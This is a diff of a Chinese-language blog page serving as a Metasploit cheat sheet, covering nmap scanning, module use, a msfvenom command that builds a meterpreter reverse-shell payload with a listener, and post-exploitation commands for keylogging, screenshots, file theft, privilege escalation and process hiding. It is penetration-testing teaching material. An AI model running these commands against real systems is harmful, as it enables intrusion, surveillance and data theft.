@@ -22,13 +22,13 @@
 
     <meta name="description" content="開啟 Metasploit Console 1msfconsole">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Metasploit 基本使用">
+<meta property="og:title" content="Metasploit 基本操作">
 <meta property="og:url" content="https://choutinghsiao.github.io/2024/06/01/ToolSecurityMetasploit/index.html">
 <meta property="og:site_name" content="Stephen&#39;s Note">
 <meta property="og:description" content="開啟 Metasploit Console 1msfconsole">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2024-06-01T20:10:00.000Z">
-<meta property="article:modified_time" content="2025-05-06T15:17:41.232Z">
+<meta property="article:modified_time" content="2025-05-08T15:10:21.014Z">
 <meta property="article:author" content="Stephen">
 <meta property="article:tag" content="Tool">
 <meta property="article:tag" content="Security">
@@ -40,10 +40,10 @@
 <link rel="canonical" href="https://choutinghsiao.github.io/2024/06/01/ToolSecurityMetasploit/">
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://choutinghsiao.github.io/2024/06/01/ToolSecurityMetasploit/","path":"2024/06/01/ToolSecurityMetasploit/","title":"Metasploit 基本使用"}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://choutinghsiao.github.io/2024/06/01/ToolSecurityMetasploit/","path":"2024/06/01/ToolSecurityMetasploit/","title":"Metasploit 基本操作"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>Metasploit 基本使用 | Stephen's Note</title>
+<title>Metasploit 基本操作 | Stephen's Note</title>
   
 
 
@@ -162,7 +162,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%96%8B%E5%95%9F-Metasploit-Console"><span class="nav-number">1.</span> <span class="nav-text">開啟 Metasploit Console</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96-PostgreSQL-%E8%B3%87%E6%96%99%E5%BA%AB"><span class="nav-number">2.</span> <span class="nav-text">初始化 PostgreSQL 資料庫</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#nmap-%E6%8E%83%E6%8F%8F"><span class="nav-number">3.</span> <span class="nav-text">nmap 掃描</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A8%A1%E7%B5%84%E6%93%8D%E4%BD%9C"><span class="nav-number">4.</span> <span class="nav-text">模組操作</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#payload-%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C"><span class="nav-number">5.</span> <span class="nav-text">payload 基本操作</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BE%8C%E6%BB%B2%E9%80%8F%E6%93%8D%E4%BD%9C-%E5%8F%96%E5%BE%97shell%E5%BE%8C"><span class="nav-number">6.</span> <span class="nav-text">後滲透操作(取得shell後)</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%96%8B%E5%95%9F-Metasploit-Console"><span class="nav-number">1.</span> <span class="nav-text">開啟 Metasploit Console</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96-PostgreSQL-%E8%B3%87%E6%96%99%E5%BA%AB"><span class="nav-number">2.</span> <span class="nav-text">初始化 PostgreSQL 資料庫</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#nmap-%E6%8E%83%E6%8F%8F"><span class="nav-number">3.</span> <span class="nav-text">nmap 掃描</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A8%A1%E7%B5%84%E6%9F%A5%E8%A9%A2"><span class="nav-number">4.</span> <span class="nav-text">模組查詢</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%BB%B2%E9%80%8F%E6%93%8D%E4%BD%9C"><span class="nav-number">5.</span> <span class="nav-text">滲透操作</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%BE%8C%E6%BB%B2%E9%80%8F%E6%93%8D%E4%BD%9C-%E5%8F%96%E5%BE%97shell%E5%BE%8C"><span class="nav-number">6.</span> <span class="nav-text">後滲透操作(取得shell後)</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -262,12 +262,12 @@
     </span>
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="Metasploit 基本使用 | Stephen's Note">
+      <meta itemprop="name" content="Metasploit 基本操作 | Stephen's Note">
       <meta itemprop="description" content="">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Metasploit 基本使用
+          Metasploit 基本操作
         </h1>
 
         <div class="post-meta-container">
@@ -285,7 +285,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">Edited on</span>
-      <time title="Modified: 2025-05-06 15:17:41" itemprop="dateModified" datetime="2025-05-06T15:17:41+00:00">2025-05-06</time>
+      <time title="Modified: 2025-05-08 15:10:21" itemprop="dateModified" datetime="2025-05-08T15:10:21+00:00">2025-05-08</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -304,7 +304,7 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">Word count in article: </span>
-      <span>782</span>
+      <span>806</span>
     </span>
     <span class="post-meta-item" title="Reading time">
       <span class="post-meta-item-icon">
@@ -329,17 +329,17 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 初始化資料庫</span></span><br><span class="line"><span class="comment"># 資料庫設定: /home/[user]/.msf4/database.yml</span></span><br><span class="line">msfdb init</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立資料庫連線</span></span><br><span class="line">msfdb start</span><br><span class="line"></span><br><span class="line"><span class="comment"># 停止資料庫連線</span></span><br><span class="line">msfdb stop</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查詢資料庫狀態</span></span><br><span class="line">db_status</span><br></pre></td></tr></table></figure>
 <h1 id="nmap-掃描"><a class="header-anchor" href="#nmap-掃描"></a>nmap 掃描</h1>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 更新 nmap</span></span><br><span class="line">db_nmap --script-updatedb</span><br><span class="line"></span><br><span class="line"><span class="comment"># 網段主機掃描</span></span><br><span class="line">db_nmap -sn [CIDR網段]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 所有端口</span></span><br><span class="line">db_nmap [IP] -p-</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定端口</span></span><br><span class="line">db_nmap [IP] -p [端口]</span><br><span class="line">db_nmap [IP] -p [起始端口]-[結束端口]</span><br><span class="line">db_nmap [IP] -p [端口1],[端口2]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基礎服務掃描</span></span><br><span class="line">db_nmap -sV -p- [IP]</span><br><span class="line"></span><br><span class="line"><span class="comment"># OS 識別</span></span><br><span class="line">db_nmap [IP] -p [端口] -O</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 script 掃描漏洞</span></span><br><span class="line"><span class="comment"># script 路徑: /usr/share/nmap/scripts</span></span><br><span class="line">db_nmap -sV --script [漏洞script檔] [IP]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 掃描結果導出</span></span><br><span class="line">db_nmap [IP] -p [端口] -oN result.txt</span><br><span class="line">db_nmap [IP] -p [端口] -oX result.xml</span><br></pre></td></tr></table></figure>
-<h1 id="模組操作"><a class="header-anchor" href="#模組操作"></a>模組操作</h1>
+<h1 id="模組查詢"><a class="header-anchor" href="#模組查詢"></a>模組查詢</h1>
 <p>⭐ 更新可用模組</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfupdate</span><br></pre></td></tr></table></figure>
 <p>⭐ 顯示可用模組</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 顯示所有可用的漏洞利用模組，用於針對目標系統的已知漏洞進行攻擊</span></span><br><span class="line">show exploits</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的 payload 模組，攻擊成功後在目標系統上執行的代碼</span></span><br><span class="line">show payloads</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的輔助模組，用於前期的偵察和目標信息收集</span></span><br><span class="line">show auxiliary</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的後滲透模組，用於在目標系統上進一步執行操作</span></span><br><span class="line">show post</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的編碼器，用於對 payload 進行編碼躲避檢測</span></span><br><span class="line">show encoders</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的 NOP 生成器，用於填充緩衝區避免其他指令干擾 payload</span></span><br><span class="line">show nops</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 顯示所有可用的輔助模組，用於前期的偵察和目標信息收集</span></span><br><span class="line">show auxiliary</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的漏洞利用模組，用於針對目標系統的已知漏洞進行攻擊</span></span><br><span class="line">show exploits</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的 payload 模組，攻擊成功後在目標系統上執行的代碼</span></span><br><span class="line">show payloads</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的 NOP 生成器，用於填充緩衝區避免其他指令干擾 payload</span></span><br><span class="line">show nops</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的編碼器，用於對 payload 進行編碼躲避檢測</span></span><br><span class="line">show encoders</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示所有可用的後滲透模組，用於取得會話後，在目標系統上進一步執行操作</span></span><br><span class="line">show post</span><br></pre></td></tr></table></figure>
 <p>⭐ 查找模組</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search [模組名稱或關鍵詞]</span><br></pre></td></tr></table></figure>
 <p>⭐ 模組使用</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 載入模組</span></span><br><span class="line">use [模組路徑]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看模組詳情</span></span><br><span class="line">info</span><br><span class="line"></span><br><span class="line"><span class="comment"># 設置參數</span></span><br><span class="line"><span class="built_in">set</span> [參數名] [參數值]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看當前配置</span></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line"><span class="comment"># 啟動</span></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-<h1 id="payload-基本操作"><a class="header-anchor" href="#payload-基本操作"></a>payload 基本操作</h1>
-<p>⭐ 接口介紹</p>
+<h1 id="滲透操作"><a class="header-anchor" href="#滲透操作"></a>滲透操作</h1>
+<p>⭐ 常用會話接口介紹</p>
 <table>
 <thead>
 <tr>
@@ -362,13 +362,14 @@
 </tr>
 </tbody>
 </table>
-<p>⭐ 創建 meterpreter payload :</p>
+<p>⭐ 創建 meterpreter 會話接口的 payload :</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=[監聽機IP位置] LPORT=[監聽機端口] -f elf -o payload.elf</span><br></pre></td></tr></table></figure>
 <p>⭐ 啟動監聽服務，等待遠端執行 meterpreter payload</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST [監聽機IP位置]</span><br><span class="line"><span class="built_in">set</span> LPORT [監聽機端口]</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
 <p>⭐ 遠端執行 meterpreter payload</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 給予執行權限</span></span><br><span class="line"><span class="built_in">chmod</span> +x payload.elf</span><br><span class="line"><span class="comment"># 執行 payload</span></span><br><span class="line">./payload.elf</span><br></pre></td></tr></table></figure>
 <h1 id="後滲透操作-取得shell後"><a class="header-anchor" href="#後滲透操作-取得shell後"></a>後滲透操作(取得shell後)</h1>
+<p>獲得會話接口後常用命令</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 列出當前活動會話</span></span><br><span class="line">sessions -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># 連接到一個會話</span></span><br><span class="line">sessions -i [會話ID]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取系統信息</span></span><br><span class="line">sysinfo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取使用者信息</span></span><br><span class="line">getuid</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取系統信息</span></span><br><span class="line">getsystem</span><br><span class="line"></span><br><span class="line"><span class="comment"># 獲取shell</span></span><br><span class="line">shell</span><br><span class="line"></span><br><span class="line"><span class="comment"># 鍵盤記錄</span></span><br><span class="line">keyscan_start、keyscan_stop、keyscan_dump</span><br><span class="line"></span><br><span class="line"><span class="comment"># 屏幕截圖:</span></span><br><span class="line">screenshot</span><br><span class="line"></span><br><span class="line"><span class="comment"># 上傳文件、下載文件</span></span><br><span class="line">download [遠程文件路徑] [本地目標路徑]</span><br><span class="line">upload [本地文件路徑] [遠程目標路徑]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 執行命令</span></span><br><span class="line">execute -f [可執行文件] -H</span><br><span class="line"></span><br><span class="line"><span class="comment"># 隱藏進程在其他進程中</span></span><br><span class="line">migrate -N [程式]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 網絡偵查</span></span><br><span class="line">run packetrecorder、run arp_scanner</span><br><span class="line"></span><br><span class="line"><span class="comment"># 當前 session 放置背景執行</span></span><br><span class="line">background</span><br></pre></td></tr></table></figure>
 <div class="note warning"><p>📜 參考資料</p>
 <ol>
@@ -391,7 +392,7 @@
   </li>
   <li class="post-copyright-link">
       <strong>Post link: </strong>
-      <a href="https://choutinghsiao.github.io/2024/06/01/ToolSecurityMetasploit/" title="Metasploit 基本使用">https://choutinghsiao.github.io/2024/06/01/ToolSecurityMetasploit/</a>
+      <a href="https://choutinghsiao.github.io/2024/06/01/ToolSecurityMetasploit/" title="Metasploit 基本操作">https://choutinghsiao.github.io/2024/06/01/ToolSecurityMetasploit/</a>
   </li>
   <li class="post-copyright-license">
       <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
@@ -448,7 +449,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="Word count total">15k</span>
+    <span title="Word count total">16k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
